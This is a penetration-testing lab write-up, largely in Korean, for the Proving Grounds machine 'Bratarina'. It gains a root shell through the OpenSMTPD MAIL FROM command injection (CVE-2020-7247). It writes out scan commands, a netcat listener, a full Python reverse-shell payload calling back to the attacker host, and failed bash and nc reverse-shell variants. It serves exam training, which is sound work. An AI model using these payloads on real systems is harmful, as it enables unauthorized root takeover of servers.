# Bratarina

**Platform:** Offensive Security Proving Grounds (PG Practice) **IP:** 192.168.51.71 **Difficulty:** Easy **OS:** Linux (Ubuntu 18.04) **Type:** Boot2Root **Date:** 2026-04-04 **Status:** ✅ Rooted

---

## Tags

`#pgpractice` `#linux` `#opensmtpd` `#rce` `#bufferoverflow` `#python-reverse-shell` `#oscp`

---

## Summary

OpenSMTPD 취약 버전의 MAIL FROM RCE (CVE-2020-7247)를 이용해 초기 접근과 동시에 root shell 획득. bash/nc reverse shell이 막혀 있어 python reverse shell + 포트 80 사용이 핵심.

---

## Enumeration

### Port Scan

```bash
nmap -p- --min-rate 10000 -T4 192.168.51.71
```

```
PORT    STATE  SERVICE
22/tcp  open   ssh
25/tcp  open   smtp
53/tcp  closed domain
80/tcp  open   http
445/tcp open   microsoft-ds
```

### Service Scan

```bash
nmap -sC -sV -p 22,25,80,445 --min-rate 10000 -T4 192.168.51.71
```

|Port|Service|Version|
|---|---|---|
|22|SSH|OpenSSH 7.6p1 Ubuntu|
|25|SMTP|**OpenSMTPD 2.0.0**|
|80|HTTP|nginx 1.14.0 (FlaskBB)|
|445|SMB|Samba 4.7.6-Ubuntu|

### Key Findings

- **OpenSMTPD 2.0.0** → CVE-2020-7247 (MAIL FROM RCE) — 핵심 취약점
- HTTP 80 → FlaskBB (dead end)
- SMB 445 → COFFEECORP workgroup (보조 확인만)

---

## Exploitation

### Vulnerability

**OpenSMTPD 6.6.1 Remote Code Execution (EDB-47984)**

- MAIL FROM 필드에 세미콜론으로 감싼 명령어 삽입 가능
- OpenSMTPD가 root 권한으로 실행 중 → 직접 root shell 획득

### Step 1 — exploit 준비

```bash
searchsploit -m 47984
```

### Step 2 — 리스너 열기

```bash
nc -lvnp 80
```

> ⚠️ **Note:** 포트 4444는 방화벽에 막혀 있음. **포트 80** 사용해야 연결됨.

### Step 3 — exploit 실행

```bash
python3 ~/47984.py 192.168.51.71 25 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.49.51\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"'
```

> ⚠️ **Note:** bash reverse shell (`bash -i >& /dev/tcp/...`)은 `&` 문자가 bad char로 막힘. nc reverse shell (`nc -e /bin/bash`)도 동작 안 함. **python reverse shell** 사용해야 함.

### Result

```
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
```

```
connect to [192.168.49.51] from (UNKNOWN) [192.168.51.71]
root@bratarina:~#
```

---

## Post Exploitation

```bash
whoami
# root
```

### Root Flag

```bash
cat /root/proof.txt
# 7311659c166169111b9d2fd27fa74850
```

---

## Flags

|Flag|Location|Value|
|---|---|---|
|proof.txt|`/root/proof.txt`|`7311659c166169111b9d2fd27fa74850`|

> **Note:** OpenSMTPD가 root로 실행되어 초기 접근 시 바로 root — `local.txt` 없음.

---

## Attack Chain

```
Nmap → OpenSMTPD 2.0.0 발견 → EDB-47984 exploit
→ python reverse shell (포트 80) → root@bratarina → proof.txt
```

---

## Failed Attempts & 실패 원인

|시도|결과|실패 원인|
|---|---|---|
|`bash -i >& /dev/tcp/IP/4444 0>&1`|❌ Error 503|`&` 문자가 OpenSMTPD bad char로 차단됨|
|`bash -c "bash -i >& /dev/tcp/..."`|❌ Error 503|동일하게 `&` 차단|
|`nc IP 4444 -e /bin/bash`|❌ 연결 안됨|nc `-e` 옵션 없거나 포트 4444 방화벽 차단|
|base64 인코딩 payload|❌ 연결 안됨|타겟→Kali HTTP 연결 불가|
|wget으로 shell.sh 다운로드|❌ HTTP 요청 안옴|아웃바운드 HTTP 연결 제한|
|포트 4444 python reverse shell|❌ 연결 안됨|포트 4444 아웃바운드 차단|

---

## Lessons Learned

- **OpenSMTPD exploit에서 `&` 문자는 bad char** → bash redirect 방식 사용 불가
- **포트 4444는 PG에서 자주 막힘** → 포트 80, 443, 8080 등 일반 포트 시도
- **bash/nc가 안될 때 python reverse shell** 시도 — `os.dup2` 방식이 가장 안정적
- OpenSMTPD는 root로 실행되는 경우가 많아 **초기 접근 = root** 가능
- exploit 후 shell이 바로 안 뜰 수 있음 → 최대 1분 대기

---

## References

- [Exploit-DB 47984: OpenSMTPD 6.6.1 RCE](https://www.exploit-db.com/exploits/47984)
- CVE-2020-7247
- Python reverse shell one-liner (os.dup2 방식)